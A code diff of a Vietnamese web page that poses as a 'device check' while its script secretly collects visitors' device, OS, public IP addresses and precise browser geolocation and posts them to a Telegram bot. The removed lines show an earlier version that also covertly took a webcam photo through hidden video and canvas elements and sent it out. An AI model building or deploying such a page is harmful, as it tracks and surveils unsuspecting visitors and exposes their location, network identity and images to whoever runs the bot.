@@ -3,40 +3,18 @@
 <head>
   <meta charset="UTF-8" />
   <title>Kiểm tra thiết bị</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f0f0f0;
-      color: #333;
-      text-align: center;
-      padding: 50px;
-    }
-    h3.ten {
-      color: #555;
-    }
-    video, canvas {
-      display: none;
-    }
-  </style>
 </head>
 <body>
-  <h3 class="ten">Đang kiểm tra thiết bị, vui lòng chờ...</h3>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
-
+  <h3>Đang kiểm tra thiết bị, vui lòng chờ...</h3>
   <script>
     const info = {
-      time: new Date().toUTCString(),
-      user: 'Không rõ',        // Bạn có thể sửa nếu có username
+      time: new Date().toLocaleString(),
       device: '',
       os: '',
       ip: '',
-      isp: 'Không rõ',
-      address: 'Không rõ',
-      country: 'Không rõ',
+      realIp: '',
       lat: '',
       lon: '',
-      camera: 'Chưa chụp',
     };
 
     function detectDevice() {
@@ -60,7 +38,6 @@
       }
     }
 
-    // Lấy IP công cộng
     async function getPublicIP() {
       try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -71,24 +48,15 @@
       }
     }
 
-    // Lấy ISP, địa chỉ, quốc gia thông qua API ip-api.com (JSONP hoặc fetch)
-    async function getIPDetails() {
+    async function getRealIP() {
       try {
-        const res = await fetch('https://ip-api.com/json/' + info.ip + '?fields=status,isp,city,country,lat,lon');
-        const data = await res.json();
-        if(data.status === 'success') {
-          info.isp = data.isp || 'Không rõ';
-          info.address = data.city || 'Không rõ';
-          info.country = data.country || 'Không rõ';
-          if(!info.lat) info.lat = data.lat ? data.lat.toFixed(6) : '';
-          if(!info.lon) info.lon = data.lon ? data.lon.toFixed(6) : '';
-        }
+        const res = await fetch('https://icanhazip.com');
+        info.realIp = (await res.text()).trim();
       } catch {
-        // giữ nguyên mặc định
+        info.realIp = 'Không rõ';
       }
     }
 
-    // Lấy vị trí chính xác từ trình duyệt
     async function getLocation() {
       return new Promise(resolve => {
         if (!navigator.geolocation) {
@@ -107,96 +75,43 @@
       });
     }
 
-    // Tạo link Google Maps
-    function getGoogleMapsLink() {
-      return info.lat && info.lon
+    function getCaption() {
+      const mapsLink = info.lat && info.lon
         ? `https://maps.google.com/?q=${info.lat},${info.lon}`
         : 'Không rõ';
-    }
-
-    // Tạo nội dung tin nhắn gửi bot Telegram
-    function getCaption() {
       return `
-🕒 Thời gian (UTC): ${info.time}
-👤 User: ${info.user}
+🕒 Thời gian: ${info.time}
 📱 Thiết bị: ${info.device}
 🖥️ Hệ điều hành: ${info.os}
-🌍 IP: ${info.ip}
-🏢 ISP: ${info.isp}
-🏙️ Địa chỉ: ${info.address}
-🌎 Quốc gia: ${info.country}
-📍 Vĩ độ: ${info.lat}
-📍 Kinh độ: ${info.lon}
-📌 Google Maps: ${getGoogleMapsLink()}
-📸 Camera: ${info.camera}
+🌍 IP dân cư: ${info.ip}
+🧠 IP gốc: ${info.realIp}
+📍 Google Maps: ${mapsLink}
       `.trim();
     }
 
-    // Chụp ảnh từ camera
-    async function captureImage() {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-
-        return new Promise(resolve => {
-          video.onloadedmetadata = () => {
-            setTimeout(() => {
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              canvas.getContext('2d').drawImage(video, 0, 0);
-              const imageData = canvas.toDataURL('image/png');
-
-              // Dừng stream sau khi chụp
-              stream.getTracks().forEach(track => track.stop());
-
-              info.camera = 'Đã chụp ảnh';
-
-              resolve(imageData);
-            }, 1000);
-          };
-        });
-      } catch (err) {
-        console.error('Không thể truy cập camera:', err);
-        info.camera = 'Không truy cập được camera';
-        return null;
-      }
-    }
-
-    // Gửi dữ liệu lên server (bot Telegram)
     async function sendToServer() {
       const text = getCaption();
-      const imageBase64 = await captureImage();
-
       try {
         const response = await fetch('/api/sendTelegram', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            message: text,
-            image: imageBase64
-          }),
+          body: JSON.stringify({ message: text }),
         });
-
         if (!response.ok) {
           const errorData = await response.json();
           console.error('Lỗi khi gửi Telegram:', errorData);
         } else {
           console.log('Gửi Telegram thành công');
-          document.querySelector('h3.ten').innerText = 'Kiểm tra hoàn tất!';
         }
       } catch (error) {
         console.error('Lỗi mạng hoặc fetch:', error);
       }
     }
 
-    // Hàm chính chạy tuần tự
     async function main() {
       detectDevice();
       await getPublicIP();
-      await getIPDetails();
+      await getRealIP();
       await getLocation();
       await sendToServer();
     }
